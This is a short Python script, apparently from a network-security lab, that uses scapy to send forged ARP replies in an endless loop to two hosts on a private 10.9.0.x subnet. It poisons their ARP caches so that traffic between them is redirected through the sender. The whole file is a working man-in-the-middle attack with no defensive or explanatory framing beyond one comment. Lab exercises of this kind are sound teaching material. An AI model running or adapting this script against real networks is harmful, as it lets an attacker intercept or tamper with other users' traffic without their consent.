import scapy.all as scapy
import time

# ARP reply, tells (pdst hwdst) that psrc is me(who sends this packet)
packet_1 = scapy.ARP(op=2, pdst='10.9.0.6',
                     hwdst='02:42:0a:09:00:06', psrc='10.9.0.5')
packet_2 = scapy.ARP(op=2, pdst='10.9.0.5',
                     hwdst='02:42:0a:09:00:05', psrc='10.9.0.6')


def start_spoof():
    while True:
        scapy.send(packet_1)
        scapy.send(packet_2)
        time.sleep(1)


if __name__ == '__main__':
    start_spoof()

